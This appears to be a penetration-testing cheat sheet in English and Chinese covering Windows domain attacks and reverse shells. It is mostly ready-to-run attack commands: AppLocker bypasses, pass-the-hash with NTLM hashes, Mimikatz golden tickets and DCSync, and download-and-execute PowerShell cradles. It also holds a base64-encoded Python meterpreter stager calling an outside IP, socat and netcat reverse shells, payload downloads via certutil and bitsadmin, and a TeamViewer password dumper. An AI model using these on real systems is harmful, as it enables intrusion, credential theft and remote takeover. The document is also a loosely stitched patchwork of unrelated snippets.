![mantis2](https://user-images.githubusercontent.com/7115563/34785499-a0e7d838-f631-11e7-869f-d6fcdc1051e9.png)

Reference: http://teohm.com/blog/using-sshuttle-in-daily-work/



<a name="windowsad"></a><h2> Windows AD Environment </h2>

<a name="applocker"></a><h3> Bypass Applocker </h3>

<b>1. rundll32</b>

```rundll32.exe PowerShdll.dll,main```

![applocker](https://user-images.githubusercontent.com/7115563/34455568-dfe7d7c6-ed81-11e7-9869-de2d4e92f3aa.png)
  
  Reference: https://github.com/p3nt4/PowerShdll
  
<b>2. Alternative powershell files</b>

![applocker2](https://user-images.githubusercontent.com/7115563/34455569-e0136c6a-ed81-11e7-9b0e-127ae9d395e0.png)
  
  ```C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise```
  
  
 <a name="pth"></a> <h3> Pass The Hash </h3>
  
  
  <b> Invoke a command Remotely </b>
  
  <pre>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1')
 
 Invoke-WMIExec -Target SVHOST2  -Username Administrator -Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "powershell whoami | out-file \\SVHOST2\C$\windows\bitch.txt"
</pre>

  <b> Invoke Mimikatz Remotely </b>
  
  <pre>Invoke-WMIExec -Target SVHOST2  -Username Administrator
-Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "powershell -Enc SQBFA...AoA"</pre>

![image](https://user-images.githubusercontent.com/7115563/34455757-1f6aed1c-ed86-11e7-9415-595fa5e8d6e7.png)
  
  <b> Pass The Hash with Mimikatz </b>
  
  <pre> Invoke-Mimikatz -Command '"sekurlsa::pth /user:adm_maint /ntlm:cbe55f143fcb6d4687583af520123b89 /domain:lazuli"'</pre>
  
  
  <a name="krb"></a><h3> Kerberos </h3>
  
  
  <b> Generate Golden Ticket (Domain Admin Required) </b>
  
  <pre>Invoke-Mimikatz -Command '"lsadump::dcsync /domain:LAZULI.CORP /user:krbtgt"'</pre>
  
  ![image](https://user-images.githubusercontent.com/7115563/34455725-7230ee30-ed85-11e7-9333-16372355ce60.png)
  
  ![image](https://user-images.githubusercontent.com/7115563/34455734-89934d5c-ed85-11e7-960e-9659e099c9df.png)
  
  <pre>Invoke-Mimikatz  -Command '"kerberos::golden /user:adon /domain:LAZULI.CORP /krbtgt:ca1c2aeda9160094be9971bdc21c50aa /sid:S-1-5-21-1238634245-2147606590-2801756923 /id:500 /ticket:admin.kirbi /ptt"</pre>
  
  ![image](https://user-images.githubusercontent.com/7115563/34455745-9edd0360-ed85-11e7-84f0-6d62e621613b.png)
  
  <pre>Invoke-Mimikatz  -Command '"kerberos::ptt admin.kirbi"'</pre>
  
  ![image](https://user-images.githubusercontent.com/7115563/34455747-b285372a-ed85-11e7-9374-c481108db77e.png)
  
  ![image](https://user-images.githubusercontent.com/7115563/34455748-bb0512c6-ed85-11e7-8d40-b6516cf8b0f3.png)
  
 <a name="miscwin"></a><h3> Miscellaneous </h3>
  
 <b> Invoke Mimikatz </b>
  
  <pre>IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz</pre>
  
  
   <b> Runas Powershell </b>
  
  ```Start-Process powershell.exe -Verb runas```
  ```Start-Process powershell.exe -Credential <user>```
  
  <b> View Shares With Permissions </b>
  
  <pre>powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Invoke-ShareFinder -CheckShareAccess"</pre>
  
  ![image](https://user-images.githubusercontent.com/7115563/34455620-34f292b4-ed83-11e7-92b0-3b8dd387146f.png)
  
  
  <b> View files that contain certain words recursively </b>
  
  <pre> ls -Path \\SVHOST1.LAZULI.CORP\tmp$ -Include "*pass*","*
admin*","*secret*" -Recurse </pre>

![image](https://user-images.githubusercontent.com/7115563/34455641-aa03adf4-ed83-11e7-8333-a69366714921.png)

<b> View files which name contains certain words recursively </b>

<pre>dir -Path \\SVHOST1.LAZULI.CORP -Include "*pass*","*admin*","*secret*" -Recurse</pre>

![image](https://user-images.githubusercontent.com/7115563/34455649-dcc941ea-ed83-11e7-9428-a702f254e807.png)

<b> Connect to MSSQL Database </b>

<pre>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/michaellwest/PowerShell-Modules/master/CorpApps/Invoke-SqlCommand.ps1')

Invoke-SqlCommand -Server 172.11.14.89 -Database master -Username sa -Password <password> -Query "exec sp_databases" </pre>

<b> Port Scanning </b>

<pre>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1')

Invoke-Portscan -Hosts [ip] -TopPorts 50</pre>
  
  ![image](https://user-images.githubusercontent.com/7115563/34455679-6e630230-ed84-11e7-995e-2eea1a6fc8dc.png)
  
  
  <b> View Domain Admins </b>
  
  <pre> net groups /domain "Domain Admins"</pre>
  
  ![image](https://user-images.githubusercontent.com/7115563/34455690-9e648d78-ed84-11e7-9a84-9b335530a31e.png)
  
  <b> View Domain Controlers </b>
  
  <pre>nltest /dclist:<domain> </pre>
  
  ![image](https://user-images.githubusercontent.com/7115563/34455698-d1504074-ed84-11e7-85ad-c4bb196c9d44.png)
  

  
<b> Get Hashes </b>

<pre>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes</pre>

  ![image](https://user-images.githubusercontent.com/7115563/34455769-66cb31bc-ed86-11e7-846e-090647d8e32f.png)
  
  
<b> Check Pass The Hash with multiple servers</b>

<pre>$hosts = @("SVDC1.LAZULI.CORP","SVFILES.LAZULI.CORP","SVHOST1.LAZULI.CORP","SVHOST2.LAZULI.CORP","SVFILES2.LAZULI.CORP")

foreach ($h in $hosts){ Invoke-WMIExec -Target $h -Username Administrator -Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "hostname" -Verbose }

</pre>

![image](https://user-images.githubusercontent.com/7115563/34455798-0bdc77ec-ed87-11e7-9504-6b9ec6fc2a8d.png)

References: https://www.hacklikeapornstar.com/
  


<a name="revshells"></a><h2> Reverse Shells </h2>

<a name="dns"></a><h3> Reverse DNS Shell with dnscat powershell </h3>

<b> Server </b>

<pre>ruby dnscat2.rb -e open --no-cache tunnel.domain.com</pre>


<b> Client </b>

<pre>IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1'); Start-Dnscat2 -Domain tunnel.domain.com -DNSServer 8.8.4.4 </pre>


![dns](https://user-images.githubusercontent.com/7115563/35040679-5a155bfa-fb82-11e7-98ec-ba015e3ad69c.png)

Reference: https://github.com/lukebaggett/dnscat2-powershell


<a name="icmp"></a><h3> Reverse ICMP shell </h3>

<b> Server </b>

<pre> python icmpsh_m.py [IP atacante] [IP victima] </pre>

<b> Client </b>

<pre>IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress [IP atacante]</pre>

![icmpreverseshell](https://user-images.githubusercontent.com/7115563/35213289-6ac51b00-ff5d-11e7-9b66-766af2aaf92e.png)

Reference: https://esgeeks.com/icmpsh-shell-reverse-con-icmp/


<a name="httpproxy"></a><h3> Reverse HTTP Shell through Proxy </h3>

<pre>use payload/python/meterpreter/reverse_http</pre>

![proxy2](https://user-images.githubusercontent.com/7115563/33836652-3d9c9624-de8a-11e7-9869-e18c5a28ebd7.png)


```python -c "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHN5cwp2aT1zeXMudmVyc2lvbl9pbmZvCnVsPV9faW1wb3J0X18oezI6J3VybGxpYjInLDM6J3VybGxpYi5yZXF1ZXN0J31bdmlbMF1dLGZyb21saXN0PVsnYnVpbGRfb3BlbmVyJywnUHJveHlIYW5kbGVyJ10pCmhzPVtdCmhzLmFwcGVuZCh1bC5Qcm94eUhhbmRsZXIoeydodHRwJzonaHR0cDovLzE5Mi4xNjguMTA3LjIzMjo4MDgwJ30pKQpvPXVsLmJ1aWxkX29wZW5lcigqaHMpCm8uYWRkaGVhZGVycz1bKCdVc2VyLUFnZW50JywnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbycpXQpleGVjKG8ub3BlbignaHR0cDovLzE3OC42Mi41OC4zNTo4MC9qOTkzQScpLnJlYWQoKSkK')))"```

Finally we set up the handler:

![proxy3](https://user-images.githubusercontent.com/7115563/33836552-fd3204ac-de89-11e7-940c-71c8ab321bf7.png)


<a name="misc"></a><h2> Miscellaneous </h2>

<a name="interactiveshell"></a><h3> Interactive Reverse Shell </h3>

<b> Method 1 </b>

Attacker:

```socat file:`tty`,raw,echo=0 TCP-L:4444```

Victim:

```wget -q http://10.10.14.16/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.16:4444```

Socat Binary: https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat

<b> Method 2 </b>

In reverse shell

<pre>
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
</pre>

In kali

<pre>
echo $TERM
stty -a
stty raw -echo
fg
</pre>

In reverse shell

<pre>
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
bash
</pre>

<a name="windowstransfer"></a><h3> Windows File Transfer </h3>

<b>bitsadmin</b>

`bitsadmin /transfer debjob /download /priority normal http://<ip>/shell.php c:\xampp\htdocs\shell.php`

<b>cscript wget.vbs (code on the repo)</b>

`cscript wget.vbs http://<ip>/test.txt test.txt`

<b>powershell</b>

`powershell -c "(new-object System.Net.WebClient).Downloadfile('http://<ip>/exploit.exe', 'C:\Windows\temp\exploit.txt')"`

<b>ftp</b>

client:

<pre>
echo open [ip] [port] > ftpscript.txt
echo anonymous>> ftpscript.txt
echo PASS >> ftpscript.txt
echo bin >> ftpscript.txt
echo get meter.exe>> ftpscript.txt
echo quit >> ftpscript.txt
ftp -s:ftpscript.txt
</pre>

server:

<code>python -m pyftpdlib  --port=2121 --write</code>

<b>wget.exe</b>

Upload to vulnerable server from kali: ` /usr/share/windows-binaries/wget.exe`

`wget.exe http://<ip>/file file`

<b> certutil </b>

`certutil -urlcache -split -f  https://<ip>/file.txt file.txt`
  
<a name="vpnrestrict"></a><h3> Bypass VPN routing restrictions </h3>

<pre>openconnect vpnXXX02.XXXX.com -u XX -s ‘vpn-slice XXX.46.0.0/16 hostname3 mantis=XXX.46.224.68’</pre>

![vpn](https://user-images.githubusercontent.com/7115563/34785073-5f76d2ce-f630-11e7-9acb-2fbe9e74494b.png)

Reference: https://github.com/dlenski/vpn-slice

# Damn Vulnerable Web Application (DVWA) 

http://dvwa.co.uk
```
docker pull vulnerables/web-dvwa
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

# 文件分析
```
Linux:
$ strings app.exe | grep -E -i 'https?://'
Windows (requires the Strings utility from Microsoft Sysinternals):

C:\> strings app.exe | findstr /i /r "htt[ps]*://"
tasklist /FI "IMAGENAME eq app.exe"
```

# Bypass any WAF for XSS easily
XSS Scanner equipped with powerful fuzzing engine & intelligent payload generator 
经典XSS模糊测试不要错过

```
https://github.com/UltimateHackers/Blazy/
Blazy is a modern login bruteforcer which also tests for CSRF, Clickjacking, Cloudflare and WAF

https://teamultimate.in/bypass-waf-xss-easily/
https://github.com/UltimateHackers/XSStrike
http://brutelogic.com.br/blog/
```
```
git clone https://github.com/UltimateHackers/XSStrike
cd XSStrike
pip install -r requirements.txt
python xsstrike
```

# 反弹
```
hacker:
nc -nvlp 443

target
mknod /tmp/backpipe p
/bin/sh -c "/bin/sh 0</tmp/backpipe | nc hackerIp 443 1>/tmp/backpipe"
```

# 后渗透获取信息teamviewer密码

```
https://github.com/attackercan/teamviewer-dumper.git
```

# html中iframe调用
```
document.getElementsByTagName("iframe")[0].contentWindow
document.getElementsByTagName("iframe")[0].ownerDocument
防御：
对Funciton等对象的toString重定义
return null，从而保护、避免代码被调试、渗透查阅
其他参考代码
var ifrm = window.frameElement; // reference to iframe element container
var doc = ifrm.ownerDocument; // reference to container's document
var form = doc.forms[0]; // reference to first form in container document
// reference to first form in parent document
var form = parent.document.forms[0];
// or, using form id instead
var form = parent.document.getElementById('myForm');
// increment and display counter variable contained in parent document
form.elements['button2'].onclick = function() {
    parent.counter++;
    this.form.elements['display'].value = 'counter in parent document is: ' + parent.counter;
}

form.elements.button3.onclick = function() {
    var re = /[^-a-zA-Z!,'?\s]/g; // to filter out unwanted characters
    // get reference to greeting text box in containing document
    var fld = parent.document.forms['demoForm'].elements['greeting'];
    var val = fld.value.replace(re, '');
    // display value in iframed document's text box
    this.form.elements.display.value = 'The greeting is: ' + val;
}

form.elements.button4.onclick = function() {
    parent.clearGreeting(); // call function in parent document
}
```


# 知识库
```
https://github.com/qazbnm456/awesome-web-security
https://github.com/Muhammd/Awesome-Pentest
https://github.com/dloss/python-pentest-tools
https://github.com/RhinoSecurityLabs/Security-Research
```
### web安全扫描框架
https://github.com/Arachni/arachni

### 摘要 
```
shasum -a 256 tor.conf
openssl sha512 tor.conf
```
